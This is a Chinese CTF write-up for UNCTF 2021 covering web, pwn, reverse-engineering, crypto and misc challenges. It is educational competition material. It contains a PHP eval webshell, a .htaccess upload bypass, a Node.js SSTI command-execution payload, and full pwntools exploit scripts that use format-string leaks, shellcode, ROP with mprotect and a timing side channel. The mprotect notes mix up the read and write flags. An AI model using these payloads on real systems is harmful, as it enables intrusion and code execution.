# UNCTF-2021 WriteUp

阅读量 **164939**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2022-01-12 14:30:14

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01234cccc1327e38e3.jpg)

## 前言

UNCTF2020是我参加的第一个CTF比赛，当时很菜成绩不太好，这次参加UNCTF2021就挺想看看成长了多少，前几天都在公开赛第一名，后面几天有事情，最后只拿了第四名。题目质量还是很不错的，挺有意思的。

## Web

### 1\. **fuzz_md5**

![](https://p0.ssl.qhimg.com/t01788d88a7ca837aa5.png)

![](https://p2.ssl.qhimg.com/t01b1891063dee5709c.png)

### 2\. **can you hack me**

![](https://p3.ssl.qhimg.com/t016ec97bdd7ec296da.png)

[www.zip源码泄露](http://www.zip%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2)

下载下来可以获取到密码，利用这个密码构造条件且利用空格绕过

?username=admin%20&password=AdminSecret

![](https://p0.ssl.qhimg.com/t01e32ff5f381caca0b.png)

### 3\. **Phpmysql**

利用Exception直接执行命令

![](https://p1.ssl.qhimg.com/t012130a44f50daa44e.png)

![](https://p2.ssl.qhimg.com/t01248cca1923ddc80e.png)

### 4\. **Bady** **write**

![](https://p1.ssl.qhimg.com/t01ef4911afb7820126.png)

因为file_put_contents可以利用数组绕过写入的数据的过滤，直接写就行了

先写一个1.jpg

<?php eval($_POST[‘a’]);?>

利用.htaccess文件上传,php过滤使用换行绕过一下

AddType application/x-httpd-php .jpg

一句话连接后就可以获得flag

### 5\. **nodejs.ssti**

![](https://p3.ssl.qhimg.com/t01372d511652f20dff.png)

<https://www.lemonprefect.cn/zh-TW/posts/603682ab.html>

参考IJCTF payload直接打就行

{{“”.toString.constructor(“return
global.process.mainModule.constructor._load(‘child_process’).execSync(‘env’).toString()”)()
}}

### 6\. **enctype login**

![](https://p4.ssl.qhimg.com/t0160c8446cf063e396.png)

因为利用js来验证登录，所以利用bp抓包直接爆破的方法不行了。

js有混淆也不会反混淆。。

所以选择利用控制台来实现

function login(i){

if(i<100000){

$(‘#password’).val(String(i));

$(‘$submit’).click();

settimeout(function() {login(i+1)},20);

}

}

### 7\. **easy_serialize**

![](https://p2.ssl.qhimg.com/t01b535ac6e084e7821.png)

md5碰撞+反序列化逃逸

利用16进制绕过flag或者可以利用双写绕过me7eorite类中的flag替换为空

GET:

?a=QNKCDZO&b=s878926199a

POST:

action=1&name=;s:4:”name”;O:9:”me7eorite”:2:{s:4:”safe”;S:5:”\2f\66\6c\61\67”;s:5:”class”;r:4;}}&pass=123&email=abcphpphpflagflagflag

###  8网页照相馆（未做出）

后面没时间做大概看了一下

主要的思路就是 自己服务器上写了一个var_dump($_SERVER);然后通过访问可以得到一个user-agent
这个谷歌浏览器的版本号有问题。好像是谷歌rce然后就没往下看了

## Pwn

### 1\. **fo**

![](https://p2.ssl.qhimg.com/t01ab0782ad6443f87e.png)

通过:AAAA%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p可以测试一下格式化字符串的偏移

![](https://p1.ssl.qhimg.com/t01d6d0949a02a90ef3.png)

然后可以看到偏移为6，然后计算金丝雀偏移就直接rbp-60h/8-1=11  
然后11+6等于17，那么17就是金丝雀位置  
格式化字符串漏洞泄露栈上的金丝雀然后通过gets函数跳转后面函数  
from pwn import *

    
    
    from pwn import *
    
    io=remote("node4.hackingfor.fun",37709)
    #io=process("./fo")
    io.recvuntil("will you?\n")
    #gdb.attach(io)
    io.sendline("%17$p")
    io.recvuntil("I will remember what you said\n")
    canary=int(io.recvuntil("00"),16)
    
    io.recvuntil("wait for your good news...\n")
    payload = 'a'*0x58+p64(canary)+'a'*8+p64(0x40080d)
    io.sendline(payload)
    io.interactive()
    

### 2\. **Sc**

![](https://p0.ssl.qhimg.com/t010f3753c84c35b19b.png)

![](https://p4.ssl.qhimg.com/t011234df877e1ed850.png)

![](https://p0.ssl.qhimg.com/t018f2e7a6e312d3af5.png)

什么都没开，感觉就是写shellcode  
写到bss段，然后栈溢出调用就好了

    
    
    from pwn import *
    context(os="linux", arch="amd64", log_level="debug")
    
    shellcode = asm(shellcraft.sh())
    
    io=remote("node2.hackingfor.fun",31715)
    
    io.recvuntil("show me your Migic\n")
    io.sendline(shellcode)
    io.recvuntil("Have you finished?\n")
    payload = 'a'*(0x18)+p64(0x601080)
    io.sendline(payload)
    
    io.interactive()
    

调用pwntools的shellcraft模块时要指明系统context(os=”linux”, arch=”amd64”)

### 3\. **magic_int**

![](https://p0.ssl.qhimg.com/t01afd5b7df3da6a078.png)

整数溢出，但是这边由于题目不知道为啥，如果使用sendline会影响gets函数的stdin，gdb调试一下可以看到直接打入了\n作为参数。不知道是不是故意的(也可能是我太菜)  
然后要着重强调一点就是，用==比较字符串时，实际上就是比较地址

![](https://p1.ssl.qhimg.com/t0198f9d1d4995f0595.png)

所以需要查看clearlove7保存的地址，然后转10进制后，写入int类型后，就能比较成功。

    
    
    # -- coding:utf-8 --    from pwn import *
    
    io = remote("node4.hackingfor.fun",31158)
    #io = process("./pwn")
    
    io.send("-2147483648")
    
    payload = 'a'*(0x70+8)+p64(0x40074c)
    io.sendline(payload)
    #gdb.attach(io)
    io.sendline("4196700")
    
    
    io.interactive()
    

### 4\. **ezfsb**

这题主要考察的就是格式化字符串漏洞覆盖大数字还有覆盖小数字，ctfwiki上有给出一个函数可以直接修改，pwntools也有一个模块可以快速修改，如果是2个字节2个字节的修改大数字的话，就比较麻烦了。  
然后这边有一点很多人都不知道，就是0x6873表示sh，可以getshell，如果知道这一点就可以很快做出这题，不需要绕过检测之后再进行ret2libc。

![](https://p4.ssl.qhimg.com/t0143f86df46aa8b5d2.png)

![](https://p1.ssl.qhimg.com/t01efcb28ace0fb0c05.png)

![](https://p0.ssl.qhimg.com/t0144946a4802c4e351.png)

第一个check是要小于2，第二个check是要大于0x1000，就直接格式化字符串漏洞进行覆盖就行了。

第一种做法往code[0]中写入0x6873然后栈溢出

    
    
    from pwn import *
    
    io=remote("node4.hackingfor.fun",38616)
    
    io.recvuntil("canary is hard!\n")
    def fmt(prev,word,index):
        fmtstr = ""
        if prev < word:
            result = word - prev
            fmtstr = '%' + str(result) + 'c'
        elif prev == word:
            result = 0
        else:
            result = 256 + word - prev        
            fmtstr = '%' + str(result) + 'c'
        fmtstr += '%' + str(index) + '$hhn'
        return fmtstr
    
    def fmt_str(offset,size,addr,target):
        payload = ""
        for i in range(4):
            if size == 4:
                payload += p32(addr + i)
            else:
                payload += p64(addr + i)
        prev = len(payload)
        for i in range(4):
            payload += fmt(prev,(target >> i *8) & 0xff,offset + i)
            prev = (target >> i * 8) &0xff
        return payload
    
    payload ='kk%7$nkk'+p32(0x0804a050)
    io.sendline(payload)
    io.recvuntil("check right\n")
    payload = fmt_str(5,4,0x0804a04c,0x6873)
    io.sendline(payload)
    io.recvuntil("good!\n")
    payload = 'a'*0x78+p32(0x08048410)+p32(0)+p32(0x0804a04c)
    io.sendline(payload)
    io.interactive()
    

![](https://p5.ssl.qhimg.com/t013d930bd9eac356d9.png)

第二种做法就是利用栈溢出ret2libc

### 5\. **ezrop**

![](https://p5.ssl.qhimg.com/t01dc84b21e830d40e0.png)

![](https://p4.ssl.qhimg.com/t01d0d042e57964ead2.png)

这个程序也太简单了。。。  
先查看一下mprotect函数

    
    
    #include <unistd.h> 
    #include <sys/mmap.h> 
    int mprotect(const void *start, size_t len, int prot); 
    
    mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。
    
    
    prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：
    
    1）PROT_READ：表示内存段内的内容可写；
    
    2）PROT_WRITE：表示内存段内的内容可读；
    
    3）PROT_EXEC：表示内存段中的内容可执行；
    
    4）PROT_NONE：表示内存段中的内容根本没法访问。
    
    
    需要指出的是，锁指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。
    

那就很明了了，利用mprotect函数修改bss段可执行，然后把shellcode写到bss段，栈溢出跳转。  
找gadget。  
一般找gadget都可以来这边找，一般程序装载都会调用__libc_csu_init函数

![](https://p4.ssl.qhimg.com/t01edccef0ee054af29.png)

![](https://p1.ssl.qhimg.com/t014505cc37d6d0a1ab.png)

然后ROPgadget查找也是必须的

![](https://p4.ssl.qhimg.com/t0121438108e8fc9254.png)

    
    
    from pwn import *
    context(os="linux", arch="amd64", log_level="debug")
    
    io=remote("node2.hackingfor.fun",31247)
    #io=process("./ezrop")
    elf = ELF("./ezrop")
    gad1 = 0x04006DA
    gad2 = 0x04006C0
    rdi = 0x4006e3
    rsi_r15 = 0x4006e1
    bss = elf.bss()
    read_plt = elf.plt['read']
    mprotect_plt = elf.plt['mprotect']
    vuln_addr = elf.symbols['vuln']
    payload = 'a'*(0x50+8)+p64(rdi)+p64(0)+p64(rsi_r15)+p64(bss)+p64(0xdeadbeef)+p64(read_plt)+p64(vuln_addr)
    io.send(payload)
    shell = p64(mprotect_plt)+asm(shellcraft.sh())
    io.send(shell)
    payload = 'a'*(0x50+8) + p64(gad1)+p64(0)+p64(1)+p64(bss)+p64(7)+p64(0x1000)+p64(0x600000)+p64(gad2)+'a'*56+p64(bss+8)
    io.sendline(payload)
    io.interactive()
    

### 6\. **magic_abs**

这题出的挺有意思的。

还是一道整数溢出，abs绝对值溢出

![](https://p3.ssl.qhimg.com/t018e4668295f6cd71c.png)

![](https://p3.ssl.qhimg.com/t018c3a6560346ab918.png)

比较简单，就溢出然后栈溢出后面函数就好。  
涉及无符号数的计算永远不会溢出，因为不能用结果为无符号整数表示的结果值被该类型可以表示的最大值加 1 之和取模减

![](https://p2.ssl.qhimg.com/t014dbd38f55a65b300.png)

    
    
    from pwn import *
    
    io=remote("node4.hackingfor.fun",35514)
    
    io.recvuntil("What's your name?\n")
    
    payload = 'a'*0x18+p64(0x4009d7)
    
    io.sendline(payload)
    
    io.recvuntil("Tell me your a g e:\n")
    io.sendline("2147483648")
    
    io.recvuntil("What's your lucky number?")
    io.sendline("-2147483648")
    
    io.interactive()
    

### 7\. **ezshell**

![](https://p5.ssl.qhimg.com/t01eb7df0f246dcef7a.png)

开了沙箱，只有open和read，并且判断了A < 0x40000000。考虑侧信道攻击。

![](https://p5.ssl.qhimg.com/t0156e7dfc13f2fc886.png)

先通过mmap函数申请了一段可执行的chunk，既然可执行，我们可以写入shellcode，然后可以通过open和read来执行我们写入的shellcode，那么就考虑侧信道攻击。  
其实就是先通过shellcode来open flag，然后把flag
read道stack上面，然后通过逐个对比字符来判断flag字符是否正确。如果正确就通过loop继续，失败就退出。  
但是由于第一个read的空间只有0x18，那只能在这边做再做一个read，然后使得能读入更多的内容

    
    
     shellcode = '''
            push 0x250
            pop rdx
            xor rsi,rsi
            mov rsi,0x10018
            xor rdi,rdi
            xor rax,rax
            syscall
        '''
    

然后就可以利用shellcraft来写入0x250的shellcode了  
`orw_payload = shellcraft.open('flag')`  
`orw_payload += shellcraft.read(3,'rsp',0x100)`  
借鉴了woodwhale师傅的二分法侧信道爆破脚本  
判断条件就是通过查看时间间隔是否大于0.1，然后通过left = mid+1二分法来缩小范围

    
    
    from pwn import *
    from LibcSearcher import *
    import sys, subprocess, warnings, os
    
    from pwnlib.adb.adb import shell
    
    def hack(pwn):
        global io,binary,libc
        times = 0
        while True:
            try:
                times += 1
                clear()
    
                pwn()
            except:
                io.close()
                io = getprocess()
    
    def init(binary):
        global arglen, elf, path , libc, context, io
        arglen = len(sys.argv)
        warnings.filterwarnings('ignore')
        context.terminal = ['gnome-terminal','-x', 'bash','-c']
        elf = ELF(binary)
        path = libcpath(binary)
        libc = ELF(path)
        libc.path = path
        context.arch = elfbit(binary)
        io = remote("node2.hackingfor.fun",30259)
    
    s           =       lambda data                       : io.send(data)
    sa          =       lambda rv,data                    : io.sendafter(rv,data)
    sl          =       lambda data                       : io.sendline(data)
    sla         =       lambda rv,data                    : io.sendlineafter(rv,data)
    r           =       lambda num                        : io.recv(num)
    rl          =       lambda keepends=True              : io.recvline(keepends)
    ru          =       lambda data,drop=True,time=null   : io.recvuntil(data,drop) if time == null else io.recvuntil(data,drop,time)
    ia          =       lambda                            : io.interactive()
    l32         =       lambda                            : u32(ru(b'\xf7',False)[-4:].ljust(4,b'\x00'))
    l64         =       lambda                            : u64(ru(b'\x7f',False)[-6:].ljust(8,b'\x00'))
    uu32        =       lambda data                       : u32(data.ljust(4,b'\x00'))
    uu64        =       lambda data                       : u64(data.ljust(8,b'\x00'))
    i16         =       lambda data                       : int(data,16)
    pau         =       lambda                            : pause() if DEBUG else null
    setlibc     =       lambda leak,func                  : leak - libc.sym[func]
    elfbit      =       lambda binary                     : 'i386' if subprocess.check_output(['file',binary]).decode().split(' ')[2] == '32-bit' else 'amd64'
    libcpath    =       lambda binary                     : subprocess.check_output(['ldd',binary]).decode().replace('    ', '').split('\n')[1].split(' ')[2] if GLIBC else subprocess.check_output(['ls | grep libc*.so'],shell=True).decode().strip('\n').split('\n')[0]
    proce       =       lambda binary,libc=null           : process(binary) if GLIBC else process(binary,env={'LD_PRELOAD':'./'+libc})
    getprocess  =       lambda                            : proce(binary,path) if arglen == 1 else (remote(sys.argv[1].split(':')[0],sys.argv[1].split(':')[1]) if arglen == 2 else remote(sys.argv[1],sys.argv[2]))
    clear       =       lambda                            : os.system('clear')
    
    # context.log_level='debug'
    DEBUG  = 1
    GLIBC  = 1
    binary = './ezshell'
    init(binary)
    
    def setread():
        global io
        shellcode = '''
            push 0x250
            pop rdx
            xor rsi,rsi
            mov rsi,0x10018
            xor rdi,rdi
            xor rax,rax
            syscall
        '''
        shellcode = asm(shellcode)
        s(shellcode)
        sleep(0.3)
    
    def pwn():
        global io
        flag = ""
        count = 1
        for i in range (len(flag),0x30):
            left = 0
            right = 256
            while left < right:
                shellcode = '''
                    push 0x250
                    pop rdx
                    xor rsi,rsi
                    mov rsi,0x10018
                    xor rdi,rdi
                    xor rax,rax
                    syscall
                '''
                shellcode = asm(shellcode)
                s(shellcode)
                mid = (left + right) >> 1
                orw_payload = shellcraft.open('flag')
                orw_payload += shellcraft.read(3,'rsp',0x100)
                orw_payload += f"""
                    mov dl,byte ptr [rsp+{i}]
                    mov cl,{mid}
                    cmp dl,cl
                    ja loop
                    mov al,0x3c
                    syscall
                    loop:
                    jmp loop
                """
                orw_payload = asm(orw_payload)
                rl()
                sl(orw_payload)
                start_time = time.time()
                try:
                    io.recv(timeout=0.1)
                    if time.time() - start_time > 0.1:
                        left = mid + 1
                except:
                    right = mid
                io.close()
                clear()
                info(f"time-->{count}")
                info(flag)
                count += 1
                io = getprocess()
            flag += chr(left)
            info(flag)
            if flag[-1] == "}":
                break
    
    pwn()
    ia()
    

### 8\. **Nnote**

一开始进去没发现有什么漏洞，还觉得有的奇怪，后面考虑到可能是堆申请溢出漏洞。  
malloc 在执行 malloc( 0 ) 时仍然会返回一个最小的堆块，那么此时记录堆块 size 的值会变成0，此时再edit这个堆块，会发生 0 –
1 整数溢出，导致可以写入很大一块内存。  
没时间做了，有点遗憾。差这题就ak了。

## RE

### 1\. **ezlogin**

打开程序，登入就好了

### 2\. **rejunk**

打开ida，虽然有混淆

但是搜索字符串

然后进去异或就好了

![](https://p4.ssl.qhimg.com/t018d4595ec084e694b.png)

## Crypto

### 1\. **Ezrsa**

记得是一个很简单的rsa 都给了，没变形，就直接做了。忘记脚本在哪儿了。签到题应该问题不大

### 2\. **探索中世纪城堡**

遍历凯撒，然后base64，然后栅栏2

### 3\. **分析badbus流量**

Usb键盘加密，20代表大写，对着写就可以了。

## MISC

杂项是真的难，只会一题

### 1\. **简单的日志审计**

我当时做的时候，题目上面就有一段base64，解密然后有一个CTF?有手就行套上unctf就行了

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **x1aoB1N** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/263650](/post/id/263650)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __2赞

 __收藏

![](https://thirdqq.qlogo.cn/g?b=oidb&k=zw52N54uzhvy3BwVicMfSUA&s=40&t=1600449349)
x1aoB1N

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

